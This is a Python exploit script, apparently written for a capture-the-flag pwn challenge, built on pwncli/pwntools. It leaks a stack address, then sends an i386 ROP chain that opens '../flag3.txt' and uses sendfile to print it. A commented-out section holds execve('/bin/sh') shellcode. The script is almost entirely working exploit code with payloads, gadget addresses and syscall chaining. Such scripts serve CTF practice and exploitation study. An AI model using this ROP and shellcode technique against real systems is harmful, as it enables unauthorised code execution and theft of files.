#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b'please input what you want say')
pads = b'a'*8
shellcode = pads
for i in shellcode:
    assert i not in b"binshBINSH"
s(shellcode)
ru(pads)
stack_base = u64_ex(rn(4)) - 0x13c
lg("stack_base")

'''
ru(b'please input what you want say')
#  shellcode = asm(shellcraft.cat("/flag"))
#  shellcode = ShellcodeMall.i386.cat_flag
shellcode = b"\x00"*0x10
shellcode += ShellcodeMall.i386.execve_bin_sh
shellcode = shellcode.ljust(0x74, b"\x90")
shellcode += p32(stack_base+0x10)
print(shellcode)
#  for i in shellcode:
    #  print(i)
    #  assert i not in b"binshBINSH"
s(shellcode)
'''

pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080df91d
pop_edx_ret = 0x0806f89b
pop_eax_ret = 0x080b8f16
pop_esi_ret = 0x08048433
int_ret     = 0x0806fea0

ru(b'please input what you want say')
payload = b'../flag3.txt\x00'
payload = payload.ljust(0x70+4, b'\x90')
payload += p32(pop_ebx_ret) + p32(stack_base)
payload += p32(pop_ecx_ret) + p32(0)
payload += p32(pop_edx_ret) + p32(0)
payload += p32(pop_eax_ret) + p32(5)
payload += p32(int_ret)
payload += p32(pop_ebx_ret) + p32(1)
payload += p32(pop_ecx_ret) + p32(7)
payload += p32(pop_edx_ret) + p32(0)
payload += p32(pop_esi_ret) + p32(0x60)
payload += p32(pop_eax_ret) + p32(0xbb)
payload += p32(int_ret)
for i in shellcode:
    assert i not in b"binshBINSH"
s(payload)

ia()
